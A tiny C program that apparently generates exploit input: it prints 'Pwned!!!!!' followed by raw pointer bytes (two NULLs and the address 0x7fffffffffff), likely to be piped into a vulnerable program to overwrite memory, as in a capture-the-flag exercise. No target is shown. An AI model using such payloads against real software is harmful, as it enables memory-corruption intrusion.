#include <stdio.h>

int main(void) {
    void *z = NULL;
    void *x = (void *) 0x7fffffffffff;
    printf("Pwned!!!!!");
    fwrite(&z, 1, sizeof(void *), stdout);
    fwrite(&z, 1, sizeof(void *), stdout);
    fwrite(&x, 1, sizeof(void *), stdout);
    printf("\n");
}
